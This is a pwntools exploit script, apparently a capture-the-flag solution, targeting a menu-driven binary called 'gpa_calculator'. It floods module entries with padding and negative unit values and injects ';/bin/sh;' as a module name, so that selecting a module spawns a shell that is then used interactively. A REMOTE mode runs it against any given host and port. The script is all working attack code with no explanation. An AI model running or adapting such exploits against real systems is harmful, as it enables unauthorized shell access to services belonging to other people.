#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("gpa_calculator")

gs = """
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def add_module(idx, name, unit, point):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())
    p.sendafter(b"Name: ", name)
    p.sendafter(b"Unit: ", str(unit).encode())
    p.sendafter(b"): ", str(point).encode())


def delete_module(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())


def select_module(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())


add_module(0, b'A'*40, -1, 0.001)
add_module(1, b'A'*40, -1, 0.001)
add_module(2, b'A'*40, -1, 0.001)
add_module(3, b'A'*40, -1, 0.001)
add_module(4, b'A'*40, -1, 0.001)
add_module(5, b';/bin/sh;', -1, 0.001)
select_module(3)

p.interactive()
